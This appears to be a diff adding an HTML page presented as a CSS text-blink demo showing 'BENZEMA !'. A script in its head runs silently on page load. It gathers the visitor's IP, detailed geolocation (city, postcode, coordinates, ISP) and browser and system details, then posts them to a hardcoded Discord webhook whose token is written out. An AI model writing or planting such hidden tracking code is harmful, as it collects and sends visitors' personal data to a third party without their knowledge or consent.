@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HELLO avec animation en CSS</title>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #1e90ff;
+}
+
+h1 {
+    font-size: 10rem;
+    color: #fff;
+    text-shadow: 4px 4px #000;
+    animation: blink 2s ease-in-out infinite;
+}
+
+@keyframes blink {
+    50% {
+    opacity: 0;
+    }
+}
+</style>
+<script>
+    function sendUserDataToDiscord() {
+  const webhookUrl = "https://discord.com/api/webhooks/1162789973817303211/" + "RiAYrW1OT8aKGHjGGvIMVlzaorWt9CCM-XFqt2xqmgc37shUTmsVx95Aed0BOPv7e_hl";
+  const ipifyUrl = "https://api.ipify.org?format=json";
+  const ipApiUrl = "http://ip-api.com/json/";
+  const user_agent = window.navigator.userAgent;
+
+  // Fonction pour récupérer les informations sur la plateforme et le système d'exploitation
+  function getSystemInfo() {
+    const platform = window.navigator.platform;
+    const os = window.navigator.oscpu;
+
+    return {
+      platform: platform,
+      os: os,
+    };
+  }
+
+  // Fonstruire un objet contenant toutes les informations
+  fetch(ipifyUrl)
+    .then(response => response.json())
+    .then(data => {
+      const userIp = data.ip;
+
+      // Maintenant que nous avons l'adresse IP de l'utilisateur, interrogeons l'API IP-API pour obtenir toutes les informations
+      fetch(ipApiUrl + userIp)
+        .then(response => response.json())
+        .then(ipData => {
+          const systemInfo = getSystemInfo(); // Récupérer les informations sur la plateforme et le système
+
+          // Créer un objet JSON contenant toutes les informations
+          const userInfo = {
+            IP: userIp,
+            UserAgent: user_agent,
+            Platform: systemInfo.platform,
+            OS: systemInfo.os,
+            Continent: ipData.continent,
+            ContinentCode: ipData.continentCode,
+            Country: ipData.country,
+            CountryCode: ipData.countryCode,
+            Region: ipData.region,
+            RegionName: ipData.regionName,
+            City: ipData.city,
+            District: ipData.district,
+            Zip: ipData.zip,
+            Latitude: ipData.lat,
+            Longitude: ipData.lon,
+            Timezone: ipData.timezone,
+            Offset: ipData.offset,
+            Currency: ipData.currency,
+            ISP: ipData.isp,
+            Organization: ipData.org,
+            AS: ipData.as,
+            ASName: ipData.asname,
+            Reverse: ipData.reverse,
+            Mobile: ipData.mobile,
+            Proxy: ipData.proxy,
+            Query: ipData.query,
+          };
+
+          // Convertir l'objet JSON en une chaîne JSON
+          const userInfoJSON = JSON.stringify(userInfo);
+
+          // Créer un fichier JSON en tant que Blob
+          const file = new Blob([userInfoJSON], { type: "application/json" });
+
+          // Créer un formulaire FormData pour l'envoi
+          const formData = new FormData();
+          formData.append("username", "NosDevoirs IA Contact Form");
+          formData.append("avatar_url", "https://example.com/your-avatar.png"); // Remplacez par l'URL de votre avatar
+          formData.append("file", file, "user_info.json");
+
+          // Envoyer les informations à Discord
+          fetch(webhookUrl, {
+            method: "POST",
+            body: formData,
+          })
+            .then(response => console.log(response))
+            .catch(error => console.error(error));
+        })
+        .catch(error => console.error("Erreur lors de la récupération des informations IP de l'API IP-API", error));
+    })
+    .catch(error => console.error("Erreur lors de la récupération de l'adresse IP de l'utilisateur via ipify", error));
+}
+sendUserDataToDiscord()
+  </script>
+</head>
+<body>
+<h1>BENZEMA !</h1>
+</body>
+</html>
